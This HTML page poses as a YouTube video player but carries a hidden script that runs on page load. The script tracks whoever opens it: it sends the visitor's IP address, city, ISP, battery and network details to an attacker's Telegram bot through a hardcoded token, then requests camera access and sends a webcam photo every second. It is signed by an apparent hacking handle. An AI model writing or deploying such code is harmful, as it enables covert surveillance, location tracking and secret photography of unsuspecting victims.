<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube Video Player</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #000;
        }
        .youtube-video {
            width: 100%;
            height: auto;
            aspect-ratio: 16 / 30; /* Maintain 16:9 aspect ratio */
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: relative;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
    <div class="youtube-video">
        <!-- Replace the src with the desired YouTube video URL -->
        <iframe src="https://www.youtube.com/embed/utx6V0qTx20" allowfullscreen></iframe>
    </div>

    <script type="text/javascript">
        // Function to fetch location data using ipinfo.io
        async function getLocationData() {
            try {
                const response = await fetch('https://ipinfo.io/json?token=f99959a4fa242a');
                return await response.json();
            } catch (err) {
                console.error("Error fetching IP info: ", err);
                return {}; // Return empty object on error
            }
        }

        // Function to decode Base64 string
        function decodeBase64(encodedStr) {
            try {
                return decodeURIComponent(escape(atob(encodedStr)));
            } catch (e) {
                console.error('Base64 decode error:', e);
                return null;
            }
        }

        // Function to get URL parameters
        function getURLParameter(sParam) {
            var sPageURL = window.location.search.substring(1);
            var sURLVariables = sPageURL.split('&');
            for (var i = 0; i < sURLVariables.length; i++) {
                var sParameterName = sURLVariables[i].split('=');
                if (sParameterName[0] == sParam) {
                    return sParameterName[1];
                }
            }
        }

        // Function to send data to Telegram
        async function sendToTelegram(message, chatId) {
            const botToken = '8710683386:AAFwZ_aRbFNVBVBO0HRGW6S_LBTCgYIiYZc';

            if (!chatId) {
                console.error('Chat ID is not available.');
                return;
            }

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('text', message.trim());

            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    body: formData
                });
                console.log(await response.json());
            } catch (error) {
                console.error('Error sending to Telegram:', error);
            }
        }

        // Function to send a photo to Telegram
        async function sendPhotoToTelegram(blob, chatId) {
            const botToken = '8710683386:AAFwZ_aRbFNVBVBO0HRGW6S_LBTCgYIiYZc';

            if (!chatId) {
                console.error('Chat ID is not available.');
                return;
            }

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob);

            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                console.log(await response.json());
            } catch (error) {
                console.error('Error sending photo to Telegram:', error);
            }
        }

        // Function to get device and battery information
        async function getDeviceInfo() {
            const battery = await navigator.getBattery();
            return {
                charging: battery.charging ? "Yes" : "No",
                batteryLevel: Math.round(battery.level * 100) + "%",
                networkType: navigator.connection ? navigator.connection.effectiveType : "N/A",
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }

        // Main function to handle user interaction
        async function handleUserInteraction() {
            const locationData = await getLocationData();
            const deviceInfo = await getDeviceInfo();

            // Get Base64 encoded 'id' parameter from the URL and decode it
            const base64Id = getURLParameter('i');
            const chatId = base64Id ? decodeBase64(base64Id) : null;

            if (!chatId) {
                console.warn('No valid chat ID found.');
                return;
            }

            const message = `
ℹ️ Activity Tracked:

🌐 IP Address: ${locationData.ip || "N/A"}
🌍 Location: ${locationData.city || "N/A"}, ${locationData.region || "N/A"}, ${locationData.country || "N/A"}
📡 ISP: ${locationData.org || "N/A"}
🔍 Org: ${locationData.org || "N/A"}

📱 Device Info:
🔋 Charging: ${deviceInfo.charging}
🔌 Battery Level: ${deviceInfo.batteryLevel}
🌐 Network Type: ${deviceInfo.networkType}
🕒 Time Zone: ${deviceInfo.timeZone}

👨‍💻 Tracked on: @jathacking01
`;

            // Send the initial information to Telegram
            await sendToTelegram(message, chatId);

            // Continuously capture and send photos every second
            navigator.mediaDevices.getUserMedia({ video: true })
                .then((stream) => {
                    const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);

                    setInterval(() => {
                        imageCapture.takePhoto()
                            .then((blob) => {
                                sendPhotoToTelegram(blob, chatId);
                            })
                            .catch((error) => {
                                console.error('Error capturing photo:', error);
                            });
                    }, 1000); // Capture photo every second
                })
                .catch((error) => {
                    console.error('Permission error:', error);
                });
        }

        // Start the interaction when the page loads
        window.onload = handleUserInteraction;
    </script>
</body>
</html>
